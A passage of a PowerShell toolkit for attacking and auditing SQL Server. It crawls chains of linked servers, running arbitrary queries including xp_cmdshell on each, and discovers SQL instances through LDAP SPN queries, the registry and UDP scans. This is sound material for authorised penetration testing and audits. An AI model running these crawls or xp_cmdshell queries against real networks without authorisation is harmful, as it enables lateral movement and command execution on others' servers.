    Get-SQLServerLinkCrawl -instance "SQLSERVER1\Instance1" -Query "select name from master..sysdatabases" -Export | where name -ne "broken link" | sort name |  Format-Table
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account to authenticate with.")]
        [string]$Username,

        [Parameter(Mandatory=$false,
        HelpMessage="SQL Server or domain account password to authenticate with.")]
        [string]$Password,

        [Parameter(Mandatory=$false,
        HelpMessage="Windows credentials.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        ValueFromPipelineByPropertyName=$true,
        HelpMessage="SQL Server instance to connection to.")]
        [string]$Instance,

        [Parameter(Mandatory=$false,
        HelpMessage="Dedicated Administrator Connection (DAC).")]
        [Switch]$DAC,

        [Parameter(Mandatory=$false,
        HelpMessage="Connection timeout.")]
        [int]$TimeOut = 2,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run on each server.")]
        [string]$Query,

        [Parameter(Mandatory=$false,
        HelpMessage="Convert collected data to exportable format.")]
        [switch]$Export
    )

    Begin
    {   
        $List = @()

        $Server = New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=@(); User=""; Sysadmin=""; CustomQuery=""}

        $List += $Server
        $SqlInfoTable = New-Object System.Data.DataTable
    }
    
    Process
    {
        $i=1
        while($i){
            $i--
            foreach($Server in $List){
                if($Server.Instance -eq "") {
                    $List = (Get-SQLServerLinkData -list $List -server $Server -query $Query)
                    $i++

                    # Verbose output
                    Write-Verbose "--------------------------------"
                    Write-Verbose " Server: $($Server.Instance)"
                    Write-Verbose "--------------------------------"
                    Write-Verbose " - Link Path to server: $($Server.Path -join ' -> ')"                    
                    Write-Verbose " - Link Login: $($Server.User)"                                   
                    Write-Verbose " - Link IsSysAdmin: $($Server.Sysadmin)"
                    Write-Verbose " - Link Count: $($Server.Links.Count)"                    
                    Write-Verbose " - Links on this server: $($Server.Links -join ', ')"
                }   
            } 
        }

        if($Export){
            $LinkList = New-Object System.Data.Datatable
            [void]$LinkList.Columns.Add("Instance")
            [void]$LinkList.Columns.Add("Version")
            [void]$LinkList.Columns.Add("Path")
            [void]$LinkList.Columns.Add("Links")
            [void]$LinkList.Columns.Add("User")
            [void]$LinkList.Columns.Add("Sysadmin")
            [void]$LinkList.Columns.Add("CustomQuery")
            
            foreach($Server in $List){
                [void]$LinkList.Rows.Add($Server.instance,$Server.version,$Server.path -join " -> ", $Server.links -join ",", $Server.user, $Server.Sysadmin, $Server.CustomQuery -join ",")
            }

            return $LinkList
        } else {
            return $List
        }
    }
  
    End
    {
    }
}

Function Get-SQLServerLinkData{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,
        HelpMessage="Return the server objects identified during the server link crawl.  Link crawling is done via theGet-SQLServerLinkCrawl function.")]
        $List,
        
        [Parameter(Mandatory=$true,
        HelpMessage="Server object to be tested")]
        $Server,

        [Parameter(Mandatory=$false,
        HelpMessage="Custom SQL query to run")]
        $Query
    )

    Begin
    {
        $SqlInfoQuery = "select @@servername as servername, @@version as version, system_user as linkuser, is_srvrolemember('sysadmin') as role"
        $SqlLinksQuery = "select srvname from master..sysservers where dataaccess=1"
    }

    Process
    {
        $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlInfoQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
        if($SqlInfoTable.Servername -ne $null){
            $Server.Instance = $SqlInfoTable.Servername
            $Server.Version = [System.String]::Join("",(($SqlInfoTable.Version)[10..25]))
            $Server.Sysadmin = $sqlInfoTable.role
            $Server.User = $sqlInfoTable.linkuser
            
            if($List.Count -eq 1) { $Server.Path += ,$sqlInfoTable.servername }

            $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $SqlLinksQuery)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
            $Server.Links = [array]$SqlInfoTable.srvname

            if($Query -ne ""){
                if($Query -like '*xp_cmdshell*'){
                    $Query =  $Query + " WITH RESULT SETS ((output VARCHAR(8000)))"
                }
                if($Query -like '*xp_dirtree*'){
                    $Query = $Query + "  WITH RESULT SETS ((output VARCHAR(8000), depth int))"
                }
                $SqlInfoTable = Get-SqlQuery -instance $Instance -Query ((Get-SQLServerLinkQuery -path $Server.Path -sql $Query)) -Timeout $Timeout -Username $UserName -Password $Password -Credential $Credential
                if($Query -like '*WITH RESULT SETS*'){
                    $Server.CustomQuery = $SqlInfoTable.output
                } else {
                    $Server.CustomQuery = $SqlInfoTable
                }
            }

            if(($Server.Path | Sort-Object | Get-Unique).Count -eq ($Server.Path).Count){
                foreach($Link in $Server.Links){
                    $Linkpath = $Server.Path + $Link
                    $List += ,(New-Object PSObject -Property @{ Instance=""; Version=""; Links=@(); Path=$Linkpath; User=""; Sysadmin=""; CustomQuery="" })
                }
            }
        } else {
            $Server.Instance = "Broken Link"
        }
        return $List
    }
}

Function Get-SQLServerLinkQuery{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="SQL link path to crawl. This is used by Get-SQLServerLinkCrawl.")]
        $Path=@(),
        
        [Parameter(Mandatory=$false,
        HelpMessage="SQL query to build the crawl path around")]
        $Sql, 
        
        [Parameter(Mandatory=$false,
        HelpMessage="Counter to determine how many single quotes needed")]
        $Ticks=0

    )
    if ($Path.length -le 1){
        return($Sql -replace "'", ("'"*[Math]::pow(2,$Ticks)))
    } else {
        return("select * from openquery(`""+$Path[1]+"`","+"'"*[Math]::pow(2,$Ticks)+
        (Get-SQLServerLinkQuery -path $Path[1..($Path.Length-1)] -sql $Sql -ticks ($Ticks+1))+"'"*[Math]::pow(2,$Ticks)+")")
    }
}

#endregion

#########################################################################
#
#region          DISCOVERY FUNCTIONS
#
#########################################################################

# -------------------------------------------
# Function: Get-DomainSpn
# -------------------------------------------
# Author: Scott Sutherland
# Reference: http://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
function Get-DomainSpn
{
    <#
            .SYNOPSIS
            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
            Note: This will use the default logon server by default.
            .PARAMETER Username
            Domain account to authenticate to Active Directory.
            .PARAMETER Password
            Domain password to authenticate to Active Directory.
            .PARAMETER Credential
            Domain credential to authenticate to Active Directory.
            .PARAMETER DomainController
            Domain controller to authenticated to. Requires username/password or credential.
            .PARAMETER ComputerName
            Computer name to filter for.
            .PARAMETER DomainAccount
            Domain account to filter for.
            .PARAMETER SpnService
            SPN service code to filter for.
            .EXAMPLE
            PS C:\temp> Get-DomainSpn -SpnService MSSQL | Select-Object -First 2

            UserSid      : 15000005210002431346712321821222048886811922073100
            User         : SQLServer1$
            UserCn       : SQLServer1
            Service      : MSSQLSvc
            ComputerName : SQLServer1.domain.local
            Spn          : MSSQLSvc/SQLServer1.domain.local:1433
            LastLogon    : 6/24/2016 6:56 AM
            Description  : This is a SQL Server test instance using a local managed service account.

            UserSid      : 15000005210002431346712321821222048886811922073101
            User         : SQLServiceAccount
            UserCn       : SQLServiceAccount
            Service      : MSSQLSvc
            ComputerName : SQLServer2.domain.local
            Spn          : MSSQLSvc/SQLServer2.domain.local:NamedInstance
            LastLogon    : 3/26/2016 3:43 PM
            Description  : This is a SQL Server test instance using a domain service account.
            .EXAMPLE
            PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SPN service code.')]
        [string]$SpnService,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message 'Getting domain SPNs...'
        }

        # Setup table to store results
        $TableDomainSpn = New-Object -TypeName System.Data.DataTable
        $null = $TableDomainSpn.Columns.Add('UserSid')
        $null = $TableDomainSpn.Columns.Add('User')
        $null = $TableDomainSpn.Columns.Add('UserCn')
        $null = $TableDomainSpn.Columns.Add('Service')
        $null = $TableDomainSpn.Columns.Add('ComputerName')
        $null = $TableDomainSpn.Columns.Add('Spn')
        $null = $TableDomainSpn.Columns.Add('LastLogon')
        $null = $TableDomainSpn.Columns.Add('Description')
        $TableDomainSpn.Clear()
    }

    Process
    {

        try
        {
            # Setup LDAP filter
            $SpnFilter = ''

            if($DomainAccount)
            {
                $SpnFilter = "(objectcategory=person)(SamAccountName=$DomainAccount)"
            }

            if($ComputerName)
            {
                $ComputerSearch = "$ComputerName`$"
                $SpnFilter = "(objectcategory=computer)(SamAccountName=$ComputerSearch)"
            }

            # Get results
            $SpnResults = Get-DomainObject -LdapFilter "(&(servicePrincipalName=$SpnService*)$SpnFilter)" -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential

            # Parse results
            $SpnResults | ForEach-Object -Process {
                [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                [string]$SidString = $SidBytes -replace ' ', ''
                $Spn = $_.properties.serviceprincipalname[0].split(',')

                foreach ($item in $Spn)
                {
                    # Parse SPNs
                    $SpnServer = $item.split('/')[1].split(':')[0].split(' ')[0]
                    $SpnService = $item.split('/')[0]

                    # Parse last logon
                    if ($_.properties.lastlogon)
                    {
                        $LastLogon = [datetime]::FromFileTime([string]$_.properties.lastlogon).ToString('g')
                    }
                    else
                    {
                        $LastLogon = ''
                    }

                    # Add results to table
                    $null = $TableDomainSpn.Rows.Add(
                        [string]$SidString,
                        [string]$_.properties.samaccountname,
                        [string]$_.properties.cn,
                        [string]$SpnService,
                        [string]$SpnServer,
                        [string]$item,
                        $LastLogon,
                        [string]$_.properties.description
                    )
                }
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
        # Check for results
        if ($TableDomainSpn.Rows.Count -gt 0)
        {
            $TableDomainSpnCount = $TableDomainSpn.Rows.Count
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
            }
            Return $TableDomainSpn
        }
        else
        {
            Write-Verbose -Message '0 SPNs found.'
        }
    }
}


# -------------------------------------------
# Function: Get-DomainObject
# -------------------------------------------
# Author: Will Schroeder
# Modifications: Scott Sutherland
function Get-DomainObject
{
    <#
            .SYNOPSIS
            Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
            Note: This will use the default logon server by default.
            .PARAMETER Username
            Domain account to authenticate to Active Directory.
            .PARAMETER Password
            Domain password to authenticate to Active Directory.
            .PARAMETER Credential
            Domain credential to authenticate to Active Directory.
            .PARAMETER DomainController
            Domain controller to authenticated to. Requires username/password or credential.
            .PARAMETER LdapFilter
            LDAP filter.
            .PARAMETER LdapPath
            Ldap path.
            .PARAMETER $Limit
            Maximum number of Objects to pull from AD, limit is 1,000.".
            .PARAMETER SearchScope
            Scope of a search as either a base, one-level, or subtree search, default is subtree..
            .EXAMPLE
            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
            .EXAMPLE
            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
            .Note
            This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP Filter.')]
        [string]$LdapFilter = '',

        [Parameter(Mandatory = $false,
        HelpMessage = 'LDAP path.')]
        [string]$LdapPath,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Maximum number of Objects to pull from AD, limit is 1,000 .')]
        [int]$Limit = 1000,

        [Parameter(Mandatory = $false,
        HelpMessage = 'scope of a search as either a base, one-level, or subtree search, default is subtree.')]
        [ValidateSet('Subtree','OneLevel','Base')]
        [string]$SearchScope = 'Subtree'
    )
    Begin
    {
        # Create PS Credential object
        if($Username -and $Password)
        {
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
        }

        # Create Create the connection to LDAP
        if ($DomainController)
        {
           
            # Verify credentials were provided
            if(-not $Username){
                Write-Output "A username and password must be provided when setting a specific domain controller."
                Break
            }

            # Test credentials and grab domain
            try {
                $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password).distinguishedname
            }catch{
                Write-Output "Authentication failed."
            }

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = '/'+$LdapPath+','+$objDomain
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController$LdapPath", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }
            else
            {
                $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }
        else
        {
            $objDomain = ([ADSI]'').distinguishedName

            # add ldap path
            if($LdapPath)
            {
                $LdapPath = $LdapPath+','+$objDomain
                $objDomainPath  = [ADSI]"LDAP://$LdapPath"
            }
            else
            {
                $objDomainPath  = [ADSI]''
            }

            $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
        }

        # Setup LDAP filter
        $objSearcher.PageSize = $Limit
        $objSearcher.Filter = $LdapFilter
        $objSearcher.SearchScope = 'Subtree'
    }

    Process
    {
        try
        {
            # Return object
            $objSearcher.FindAll() | ForEach-Object -Process {
                $_
            }
        }
        catch
        {
            "Error was $_"
            $line = $_.InvocationInfo.ScriptLineNumber
            "Error was in Line $line"
        }
    }

    End
    {
    }
}

# -------------------------------------------
# Function:  Get-SQLInstanceDomain
# -------------------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceDomain
{
    <#
            .SYNOPSIS
            Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.
            The function will default to the current user's domain and logon server, but an alternative domain controller can be provided.
            UDP scanning of management servers is optional.
            .PARAMETER Username
            Domain user to authenticate with domain\user.
            .PARAMETER Password
            Domain password to authenticate with domain\user.
            .PARAMETER Credential
            Credentials to use when connecting to a Domain Controller.
            .PARAMETER DomainController
            Domain controller for Domain and Site that you want to query against.  Only used when username/password or credential is provided.
            .PARAMETER ComputerName
            Domain computer name to filter for.
            .PARAMETER DomainAccount
            Domain account to filter for.
            .PARAMETER CheckMgmt
            Performs UDP scan of servers with registered MSServerClusterMgmtAPI SPNs to help find additional SQL Server instances.
            .PARAMETER UDPTimeOut
            Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt
            PS C:\> Get-SQLInstanceDomain -Verbose
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.
            VERBOSE: Getting domain SPNs...
            VERBOSE: 10 SPNs found on servers that matched search criteria.
            VERBOSE: Performing a UDP scan of management servers to obtain managed SQL Server instances...
            VERBOSE:  - MServer1.domain.com - UDP Scan Start.
            VERBOSE:  - MServer1.domain.com - UDP Scan Complete.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -DomainController 10.10.10.1 -Username domain\user -Password SecretPassword123!
            VERBOSE: Grabbing SQL Server SPNs from domain...
            VERBOSE: Getting domain SPNs...
            VERBOSE: Parsing SQL Server instances from SPNs...
            VERBOSE: 35 instances were found.

            ComputerName     : SQLServer1.domain.com
            Instance         : SQLServer1.domain.com
            DomainAccountSid : 1500000521000123456712921821222049996811922123456
            DomainAccount    : SQLServer1$
            DomainAccountCn  : SQLServer1
            Service          : MSSQLSvc
            Spn              : MSSQLSvc/SQLServer1.domain.com
            LastLogon        : 6/22/2016 9:00 AM
            [TRUNCATED]


    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain user to authenticate with domain\user.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain password to authenticate with domain\user.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
        [string]$DomainController,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name to filter for.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain account to filter for.')]
        [string]$DomainAccount,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Performs UDP scan of servers managing SQL Server clusters.')]
        [switch]$CheckMgmt,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds for UDP scans of management servers. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 3
    )

    Begin
    {
        # Table for SPN output
        $TblSQLServerSpns = New-Object -TypeName System.Data.DataTable
        $null = $TblSQLServerSpns.Columns.Add('ComputerName')
        $null = $TblSQLServerSpns.Columns.Add('Instance')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountSid')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccount')
        $null = $TblSQLServerSpns.Columns.Add('DomainAccountCn')
        $null = $TblSQLServerSpns.Columns.Add('Service')
        $null = $TblSQLServerSpns.Columns.Add('Spn')
        $null = $TblSQLServerSpns.Columns.Add('LastLogon')
        $null = $TblSQLServerSpns.Columns.Add('Description')

        # Table for UDP scan results of management servers
    }

    Process
    {
        # Get list of SPNs for SQL Servers
        Write-Verbose -Message 'Grabbing SPNs from the domain for SQL Servers (MSSQL*)...'
        $TblSQLServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSSQL*' -SuppressVerbose | Where-Object -FilterScript {
            $_.service -like 'MSSQL*'
        }

        Write-Verbose -Message 'Parsing SQL Server instances from SPNs...'

        # Add column containing sql server instance
        $TblSQLServers |
        ForEach-Object -Process {
            # Parse SQL Server instance
            $Spn = $_.Spn
            $Instance = $Spn.split('/')[1].split(':')[1]

            # Check if the instance is a number and use the relevent delim
            $Value = 0
            if([int32]::TryParse($Instance,[ref]$Value))
            {
                $SpnServerInstance = $Spn -replace ':', ','
            }
            else
            {
                $SpnServerInstance = $Spn -replace ':', '\'
            }

            $SpnServerInstance = $SpnServerInstance -replace 'MSSQLSvc/', ''

            # Add SQL Server spn to table
            $null = $TblSQLServerSpns.Rows.Add(
                [string]$_.ComputerName,
                [string]$SpnServerInstance,
                $_.UserSid,
                [string]$_.User,
                [string]$_.Usercn,
                [string]$_.Service,
                [string]$_.Spn,
                $_.LastLogon,
            [string]$_.Description)
        }

        # Enumerate SQL Server instances from management servers
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Grabbing SPNs from the domain for Servers managing SQL Server clusters (MSServerClusterMgmtAPI)...'
            $TblMgmtServers = Get-DomainSpn -DomainController $DomainController -Username $Username -Password $Password -Credential $Credential  -ComputerName $ComputerName -DomainAccount $DomainAccount -SpnService 'MSServerClusterMgmtAPI' -SuppressVerbose |
            Where-Object -FilterScript {
                $_.ComputerName -like '*.*'
            } |
            Select-Object -Property ComputerName -Unique |
            Sort-Object -Property ComputerName

            Write-Verbose -Message 'Performing a UDP scan of management servers to obtain managed SQL Server instances...'
            $TblMgmtSQLServers = $TblMgmtServers |
            Select-Object -Property ComputerName -Unique |
            Get-SQLInstanceScanUDP -UDPTimeOut $UDPTimeOut
        }
    }

    End
    {
        # Return data
        if($CheckMgmt)
        {
            Write-Verbose -Message 'Parsing SQL Server instances from the UDP scan...'
            $Tbl1 = $TblMgmtSQLServers |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl2 = $TblSQLServerSpns |
            Select-Object -Property ComputerName, Instance |
            Sort-Object -Property ComputerName, Instance
            $Tbl3 = $Tbl1 + $Tbl2

            $InstanceCount = $Tbl3.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $Tbl3
        }
        else
        {
            $InstanceCount = $TblSQLServerSpns.rows.count
            Write-Verbose -Message "$InstanceCount instances were found."
            $TblSQLServerSpns
        }
    }
}


# -------------------------------------------
# Function:  Get-SQLInstanceLocal
# -------------------------------------------
# Author: Scott Sutherland
Function  Get-SQLInstanceLocal
{
    <#
            .SYNOPSIS
            Returns a list of the SQL Server instances found in the Windows registry for the local system.
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal

            ComputerName       : Computer1
            Instance           : Computer1\SQLEXPRESS
            ServiceDisplayName : SQL Server (SQLEXPRESS)
            ServiceName        : MSSQL$SQLEXPRESS
            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS
            ServiceAccount     : NT Service\MSSQL$SQLEXPRESS
            State              : Running

            ComputerName       : Computer1
            Instance           : Computer1\STANDARDDEV2014
            ServiceDisplayName : SQL Server (STANDARDDEV2014)
            ServiceName        : MSSQL$STANDARDDEV2014
            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\Binn\sqlservr.exe" -sSTANDARDDEV2014
            ServiceAccount     : LocalSystem
            State              : Running

            ComputerName       : Computer1
            Instance           : Computer1
            ServiceDisplayName : SQL Server (MSSQLSERVER)
            ServiceName        : MSSQLSERVER
            ServicePath        : "C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
            ServiceAccount     : NT Service\MSSQLSERVER
            State              : Running

    #>
    Begin
    {
        # Table for output
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add('ComputerName')
        $null = $TblLocalInstances.Columns.Add('Instance')
        $null = $TblLocalInstances.Columns.Add('ServiceDisplayName')
        $null = $TblLocalInstances.Columns.Add('ServiceName')
        $null = $TblLocalInstances.Columns.Add('ServicePath')
        $null = $TblLocalInstances.Columns.Add('ServiceAccount')
        $null = $TblLocalInstances.Columns.Add('State')
    }

    Process
    {
        # Grab SQL Server services for the server
        $SqlServices = Get-SQLServiceLocal | Where-Object -FilterScript {
            $_.ServicePath -like '*sqlservr.exe*'
        }

        # Add recrds to SQL Server instance table
        $SqlServices |
        ForEach-Object -Process {
            # Parse Instance
            $ComputerName = [string]$_.ComputerName
            $DisplayName = [string]$_.ServiceDisplayName

            if($DisplayName)
            {
                $Instance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                if($Instance -like '*\MSSQLSERVER')
                {
                    $Instance = $ComputerName
                }
            }
            else
            {
                $Instance = $ComputerName
            }

            # Add record
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.ComputerName,
                [string]$Instance,
                [string]$_.ServiceDisplayName,
                [string]$_.ServiceName,
                [string]$_.ServicePath,
                [string]$_.ServiceAccount,
            [string]$_.ServiceState)
        }
    }

    End
    {

        # Status User
        $LocalInstanceCount = $TblLocalInstances.rows.count
        Write-Verbose -Message "$LocalInstanceCount local instances where found."

        # Return data
        $TblLocalInstances
    }
}


# ----------------------------------
#  Get-SQLInstanceScanUDP
# ----------------------------------
# Author: Eric Gruber
# Note: Pipeline and timeout mods by Scott Sutherland
function Get-SQLInstanceScanUDP
{
    <#
            .SYNOPSIS
            Returns a list of SQL Servers resulting from a UDP discovery scan of provided computers.
            .PARAMETER ComputerName
            Computer name or IP address to enumerate SQL Instance from.
            .PARAMETER UDPTimeOut
            Timeout in seconds. Longer timeout = more accurate.
            .EXAMPLE
            PS C:\> Get-SQLInstanceScanUDP -Verbose -ComputerName SQLServer1.domain.com
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLInstanceScanUDP -Verbose
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Start.
            VERBOSE:  - SQLServer1.domain.com - UDP Scan Complete.


            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Express
            InstanceName : Express
            ServerIP     : 10.10.10.30
            TCPPort      : 51663
            BaseVersion  : 11.0.2100.60
            IsClustered  : No

            ComputerName : SQLServer1.domain.com
            Instance     : SQLServer1.domain.com\Standard
            InstanceName : Standard
            ServerIP     : 10.10.10.30
            TCPPort      : 51861
            BaseVersion  : 11.0.2100.60
            IsClustered  : No
            [TRUNCATED]
    #>
    [CmdletBinding()]
    param(

        [Parameter(Mandatory = $true,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Computer name or IP address to enumerate SQL Instance from.')]
        [string]$ComputerName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Timeout in seconds. Longer timeout = more accurate.')]
        [int]$UDPTimeOut = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for results
        $TableResults = New-Object -TypeName system.Data.DataTable -ArgumentList 'Table'
        $null = $TableResults.columns.add('ComputerName')
        $null = $TableResults.columns.add('Instance')
        $null = $TableResults.columns.add('InstanceName')
        $null = $TableResults.columns.add('ServerIP')
        $null = $TableResults.columns.add('TCPPort')
        $null = $TableResults.columns.add('BaseVersion')
        $null = $TableResults.columns.add('IsClustered')
    }

    Process
    {
        if(-not $SuppressVerbose)
        {
            Write-Verbose -Message " - $ComputerName - UDP Scan Start."
        }

        # Verify server name isn't empty
        if ($ComputerName -ne '')
        {
            # Try to enumerate SQL Server instances from remote system
            try
            {
                # Resolve IP
                $IPAddress = [System.Net.Dns]::GetHostAddresses($ComputerName)

                # Create UDP client object
                $UDPClient = New-Object -TypeName System.Net.Sockets.Udpclient

                # Attempt to connect to system
                $UDPTimeOutMilsec = $UDPTimeOut * 1000
                $UDPClient.client.ReceiveTimeout = $UDPTimeOutMilsec
                $UDPClient.Connect($ComputerName,0x59a)
                $UDPPacket = 0x03

